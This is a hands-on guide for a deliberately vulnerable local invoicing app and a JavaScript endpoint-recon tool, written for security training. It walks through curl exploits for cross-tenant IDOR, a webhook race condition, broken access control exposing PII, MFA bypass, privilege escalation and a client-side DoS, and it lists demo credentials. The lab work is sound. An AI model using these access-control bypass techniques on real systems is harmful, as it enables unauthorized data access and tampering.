# InvoiceHub Labs — Full Setup & Testing Guide

Everything you need to go from a clean machine to **finding hidden endpoints with
BundleBleed and exploiting them by hand** in the InvoiceHub demo labs.

Read order: this file is the hands-on guide. [README.md](README.md) is the
overview, [bundlebleed-walkthrough.md](bundlebleed-walkthrough.md) is the
demo-day script, and the per-lab guides live in [challenges/](challenges/).

---

## 0. What you're setting up

Two things run side by side:

| Piece | What it is | Runs on |
|---|---|---|
| **InvoiceHub** | The deliberately vulnerable target app | `http://localhost:4000` |
| **BundleBleed** | The JS-recon tool that mines InvoiceHub's bundle | your terminal |

The loop you'll practice:

```
1. Start InvoiceHub (the target)
2. Run BundleBleed against it → get a ranked list of hidden endpoints
3. Open the report → pick the juicy /api-internal/* routes
4. Exploit each one manually → curl / Burp / browser console
```

> ⚠ **Authorized learning only.** Run everything locally. Do not expose
> InvoiceHub to the public internet — it ships intentional bugs.

---

## 1. Prerequisites

Install these once.

| Tool | Why | Check |
|---|---|---|
| **Docker + Docker Compose** | easiest way to run InvoiceHub | `docker --version` |
| **Node.js 20+** | alternative way to run InvoiceHub | `node --version` |
| **Python 3.12+** | required by BundleBleed | `python --version` |
| **uv** | BundleBleed's package/runner | `uv --version` |
| **curl** | manual exploitation | `curl --version` |
| **Burp Suite** (optional) | intercept/replay/race | — |

Install `uv` (if you don't have it):

```bash
# macOS / Linux
curl -LsSf https://astral.sh/uv/install.sh | sh

# Windows (PowerShell)
powershell -ExecutionPolicy ByPass -c "irm https://astral.sh/uv/install.ps1 | iex"
```

---

## 2. Start the target (InvoiceHub)

Pick **one** option.

### Option A — Docker (recommended)

```bash
cd labs
docker compose up --build
```

### Option B — Node directly

```bash
cd labs/invoicehub
npm install
npm start
```

**Verify it's up** (either way):

```bash
curl http://localhost:4000/healthz
# {"ok":true}
```

Then open <http://localhost:4000> in a browser. Log in with any demo account:

| Email | Role | MFA | Use for |
|---|---|---|---|
| `owner@acme.test` | owner | on | admin baseline |
| `viewer@acme.test` | viewer | off | privilege-escalation attacker |
| `support@acme.test` | support | off | broken-access-control attacker |
| `owner@globex.test` | owner (other tenant) | on | the IDOR **victim** |

Password for all: **`password123`**. Tenants: `org_ACME0001` (you) and
`org_GLOBEX02` (the victim holding the "SECRET" high-value customers).

---

## 3. Set up BundleBleed

From the **repo root** (the folder with `pyproject.toml`, one level above `labs/`):

```bash
uv sync                       # install BundleBleed + deps
# optional: headless-browser runtime capture (recommended for this lab)
uv sync --extra runtime
uv run playwright install chromium
```

Smoke-test the CLI:

```bash
uv run bundlebleed -h
uv run bundlebleed scan -h
```

---

## 4. Run BundleBleed against the lab

InvoiceHub is a fresh SPA with **no `gau`/`waybackurls` archive history**, so
inject the URLs directly with `--seed-url` (the README's "fresh / JS-heavy
target" flow).

### 4a. Baseline scan (static extraction)

```bash
uv run bundlebleed scan -t localhost \
  --seed-url http://localhost:4000/ \
  --seed-url http://localhost:4000/app.js \
  -o results/
```

### 4b. With runtime capture (see routes the SPA fires live)

```bash
uv run bundlebleed scan -t localhost \
  --seed-url http://localhost:4000/ \
  --seed-url http://localhost:4000/app.js \
  -o results/ --runtime-capture
```

### 4c. Authenticated runtime capture (loads auth-gated chunks)

Grab a session cookie first (log in as viewer, copy `SESSIONID` from DevTools →
Application → Cookies), then:

```bash
uv run bundlebleed scan -t localhost \
  --seed-url http://localhost:4000/ \
  -o results/ --runtime-capture \
  --session "viewer:SESSIONID=<your-session-cookie>"
```

### 4d. (Optional) Add the AI flavour

```bash
export OPENROUTER_API_KEY=sk-or-...
uv run bundlebleed scan -t localhost \
  --seed-url http://localhost:4000/app.js \
  -o results/ --ai --ai-provider openrouter \
  --ai-model meta-llama/llama-3.1-8b-instruct:free
```

---

## 5. Read the results

```bash
# self-contained dashboard (sortable/filterable) — best for the demo
open results/scan-result.html        # macOS
start results/scan-result.html       # Windows
xdg-open results/scan-result.html    # Linux

# human-readable summary
cat results/scan-result.md

# plain-text wordlists to pipe into other tools
ls results/wordlists/   # endpoints.txt, parameters.txt, subdomains.txt, ...
```

**What you should see surface** — including endpoints with **no UI button**:

| Endpoint | Lab | Why it's interesting |
|---|---|---|
| `/api-internal/v2/invoice-ar/proxy` | 01 | trusts `organizationId` from the query |
| `/api-internal/webhooks` | 02 | check-then-insert with no lock |
| `/api-internal/profiles` | 03 | no role check on sensitive PII |
| `/api-internal/v2/memberships/{id}` | 04 | destructive, no MFA check |
| `/api-internal/v2/sales-invoices` | 05 | create has no server-side role gate |
| `/api-internal/branding/logo` | 06 | accepts attacker-sized dimensions |
| `/api-internal/admin/v3/export-all-tenants` | — | recon bait (dead ref) |
| `/api/v1/legacy/billing/run-settlement` | — | recon bait (dead ref) |

Plus **secrets** (redacted at ingest): a PostHog-style key and an `sk_test_…`
Stripe-shaped token from `ANALYTICS_CONFIG` — both fake, demonstrating the
57-pattern scanner + redaction.

Feed the wordlist straight into your own tooling:

```bash
ffuf -w results/wordlists/endpoints.txt -u http://localhost:4000/FUZZ
```

---

## 6. Get your session + CSRF (needed for manual testing)

Log in as the relevant account in the browser, then in the **console**:

```js
const me = await (await fetch('/api-internal/auth/me', {credentials:'include'})).json();
console.log('CSRF:', me.csrfToken);       // value for the X-Csrf-Token header
console.log('Cookie:', document.cookie);  // SESSIONID=...
```

Keep both handy — several labs need the cookie, two need the CSRF token too.

---

## 7. Testing flow — exploit each lab

Do them in this order (easy → spicy). Full write-ups in
[challenges/](challenges/); one-line spoilers in
[challenges/solutions.md](challenges/solutions.md).

### Lab 01 — Cross-account IDOR ⭐ *start here (best crowd "aha")*

1. Log in as `viewer@acme.test`, open the **Customers** tab.
2. Replay the request but swap the org id to the victim tenant:

```bash
curl 'http://localhost:4000/api-internal/v2/invoice-ar/proxy?organizationId=org_GLOBEX02&path=customers' \
  -H "Cookie: SESSIONID=<your-session>"
```

3. ✅ You get Globex's customers (`SECRET Whale Corp`, IBANs). No membership check.

→ [01-idor-cross-account.md](challenges/01-idor-cross-account.md)

### Lab 02 — Webhook race condition (TOCTOU) 🌶 *spicy live demo*

1. Log in as `owner@acme.test`, grab the cookie.
2. Fire 20 identical creates concurrently:

```bash
URL="http://localhost:4000/api-internal/webhooks?organizationId=org_ACME0001"
BODY='{"name":"Web 3","url":"https://abc.example.com/hook","eventTypes":"payment-link.paid"}'
for i in $(seq 1 20); do
  curl -s -X POST "$URL" -H "Cookie: SESSIONID=<your-session>" \
    -H "Content-Type: application/json" -d "$BODY" &
done; wait
```

3. ✅ `GET /api-internal/webhooks?...` shows duplicates past the "max 5 / no
   dupes" rule.

(In Burp: Turbo Intruder single-packet / null-payload x20.)

→ [02-race-condition-webhooks.md](challenges/02-race-condition-webhooks.md)

### Lab 03 — Support reads merchant profile

1. Log in as `support@acme.test` (UI shows no profile panel — "no access").
2. Call it anyway:

```bash
curl 'http://localhost:4000/api-internal/profiles?organizationId=org_ACME0001' \
  -H "Cookie: SESSIONID=<your-session>"
```

3. ✅ Full merchant PII/KYC returned despite the permission matrix.

→ [03-broken-access-support.md](challenges/03-broken-access-support.md)

### Lab 04 — MFA not enforced server-side *(needs CSRF)*

1. List memberships, then delete one — CSRF required, MFA not:

```bash
curl -X DELETE 'http://localhost:4000/api-internal/v2/memberships/mem_vince?organizationId=org_ACME0001' \
  -H "Cookie: SESSIONID=<your-session>" \
  -H "X-Csrf-Token: <your-csrf-token>"
```

2. ✅ `{"ok":true,"removed":"mem_vince","mfaWasEnforced":false}`.

→ [04-mfa-not-enforced.md](challenges/04-mfa-not-enforced.md)

### Lab 05 — Viewer creates & issues invoices *(needs CSRF)*

1. Log in as `viewer@acme.test` (no "Create" button). Create one directly:

```bash
curl -X POST 'http://localhost:4000/api-internal/v2/sales-invoices?organizationId=org_ACME0001' \
  -H "Cookie: SESSIONID=<your-session>" \
  -H "X-Csrf-Token: <your-csrf-token>" \
  -H "Content-Type: application/json" \
  -d '{"customerName":"Ghost Buyer","amount":9999}'
```

2. ✅ `status:"issued","createdBy":"viewer"` — visible to the owner too.

→ [05-viewer-privilege-escalation.md](challenges/05-viewer-privilege-escalation.md)

### Lab 06 — Client-side DoS via oversized logo

1. Log in as `owner@acme.test`, open **Branding**.
2. Set Width/Height to `30000`, click **Render preview**.
3. ✅ The tab hangs allocating a giant canvas (start at 20000 — you can crash
   your own tab).

→ [06-client-side-dos.md](challenges/06-client-side-dos.md)

---

## 8. The takeaway to leave people with

Five of the six bugs share one root cause: **authorization decided in the client**
(a hidden button, a hidden tab, an org id chosen by the UI) **instead of the
server.** The JS bundle lists every endpoint the client can reach — BundleBleed
reads it for you at scale and ranks the ones worth your manual time. **It finds;
you exploit.**

---

## 9. Reset & teardown

```bash
# InvoiceHub is fully in-memory — just restart it to wipe all state
# Docker:
docker compose down && docker compose up --build
# Node:
# Ctrl-C, then `npm start` again

# Clear BundleBleed output between runs
rm -rf results/
```

---

## 10. Troubleshooting

| Symptom | Fix |
|---|---|
| `curl http://localhost:4000/healthz` fails | InvoiceHub isn't running — go back to §2 |
| BundleBleed finds no endpoints | make sure you seeded `--seed-url http://localhost:4000/app.js` |
| `401 not authenticated` on curl | your `SESSIONID` cookie is missing/expired — re-login, re-copy |
| `403 bad csrf token` | grab a fresh `csrfToken` from `/api-internal/auth/me` (§6) |
| `playwright` errors with `--runtime-capture` | run `uv sync --extra runtime && uv run playwright install chromium` |
| Port 4000 already in use | `PORT=4100 npm start` (Node) or edit `docker-compose.yml` |
| Race lab shows no duplicates | increase concurrency (30–50) or use Burp Turbo Intruder single-packet |
